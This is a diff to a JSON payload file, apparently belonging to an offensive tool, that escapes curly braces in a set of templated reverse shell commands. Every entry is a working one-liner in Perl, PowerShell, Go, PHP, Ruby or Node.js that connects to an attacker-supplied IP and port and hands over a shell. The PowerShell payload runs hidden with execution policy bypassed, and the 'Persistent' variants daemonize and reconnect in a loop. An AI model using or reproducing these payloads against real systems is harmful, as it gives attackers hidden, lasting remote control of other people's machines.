@@ -26,7 +26,7 @@
     },
     "perl": {
       "name": "Perl",
-      "payload": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+      "payload": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
       "description": "Perl socket reverse shell",
       "requirements": "perl"
     },
@@ -44,13 +44,13 @@
     },
     "powershell": {
       "name": "PowerShell",
-      "payload": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
+      "payload": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
       "description": "PowerShell reverse shell with hidden window",
       "requirements": "powershell"
     },
     "golang": {
       "name": "Go",
-      "payload": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
+      "payload": "echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run();}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
       "description": "Go reverse shell (compile and execute)",
       "requirements": "go compiler"
     },
@@ -112,25 +112,25 @@
     },
     "perl": {
       "name": "Perl (Persistent)",
-      "payload": "perl -e 'use Socket;use POSIX;fork&&exit;setsid;chdir\"/\";while(1){socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in({port},inet_aton(\"{ip}\")))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");system(\"/bin/sh -i\");}close(S);sleep(10);}' &",
+      "payload": "perl -e 'use Socket;use POSIX;fork&&exit;setsid;chdir\"/\";while(1){{socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in({port},inet_aton(\"{ip}\")))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");system(\"/bin/sh -i\");}}close(S);sleep(10);}}' &",
       "description": "Persistent Perl daemon with auto-reconnect",
       "requirements": "perl"
     },
     "php": {
       "name": "PHP (Persistent)",
-      "payload": "php -r 'pcntl_fork()||exit;posix_setsid();chdir(\"/\");while(1){$s=fsockopen(\"{ip}\",{port});if($s){proc_open(\"/bin/sh -i\",array(0=>$s,1=>$s,2=>$s),$pipes);}fclose($s);sleep(10);}' &",
+      "payload": "php -r 'pcntl_fork()||exit;posix_setsid();chdir(\"/\");while(1){{$s=fsockopen(\"{ip}\",{port});if($s){{proc_open(\"/bin/sh -i\",array(0=>$s,1=>$s,2=>$s),$pipes);}}fclose($s);sleep(10);}}' &",
       "description": "Persistent PHP daemon with auto-reconnect",
       "requirements": "php-cli with pcntl extension"
     },
     "ruby": {
       "name": "Ruby (Persistent)",
-      "payload": "ruby -e 'require \"socket\";Process.daemon;while(1);begin;s=TCPSocket.open(\"{ip}\",{port});[0,1,2].each{|fd|syscall(33,s.fileno,fd)};system(\"/bin/sh -i\");rescue;sleep(10);end;end' &",
+      "payload": "ruby -e 'require \"socket\";Process.daemon;while(1);begin;s=TCPSocket.open(\"{ip}\",{port});[0,1,2].each{{|fd|syscall(33,s.fileno,fd)}};system(\"/bin/sh -i\");rescue;sleep(10);end;end' &",
       "description": "Persistent Ruby daemon with auto-reconnect",
       "requirements": "ruby"
     },
     "node": {
       "name": "Node.js (Persistent)",
-      "payload": "node -e \"require('child_process').spawn('node',['-e','const net=require(\\\"net\\\");const{spawn}=require(\\\"child_process\\\");process.daemon=true;setInterval(()=>{try{const client=new net.Socket();client.connect({port},\\\"{ip}\\\",()=>{const sh=spawn(\\\"/bin/sh\\\",[]);client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});}catch(e){}}30000);'],{detached:true,stdio:'ignore'}).unref();\" &",
+      "payload": "node -e \"require('child_process').spawn('node',['-e','const net=require(\\\"net\\\");const{{spawn}}=require(\\\"child_process\\\");process.daemon=true;setInterval(()=>{{try{{const client=new net.Socket();client.connect({port},\\\"{ip}\\\",()=>{{const sh=spawn(\\\"/bin/sh\\\",[]);client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});}}catch(e){{}}}}30000);'],{{detached:true,stdio:'ignore'}}).unref();\" &",
       "description": "Persistent Node.js daemon with auto-reconnect",
       "requirements": "node"
     },
@@ -154,7 +154,7 @@
     },
     "golang": {
       "name": "Go (Persistent)",
-      "payload": "echo 'package main;import(\"os/exec\";\"net\";\"time\";\"os\");func main(){for{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");if c!=nil{cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run();c.Close();}time.Sleep(10*time.Second);}}' > /tmp/p.go && nohup go run /tmp/p.go >/dev/null 2>&1 & rm /tmp/p.go",
+      "payload": "echo 'package main;import(\"os/exec\";\"net\";\"time\";\"os\");func main(){{for{{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");if c!=nil{{cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run();c.Close();}}time.Sleep(10*time.Second);}}}}' > /tmp/p.go && nohup go run /tmp/p.go >/dev/null 2>&1 & rm /tmp/p.go",
       "description": "Persistent Go reverse shell with auto-reconnect",
       "requirements": "go compiler"
     },
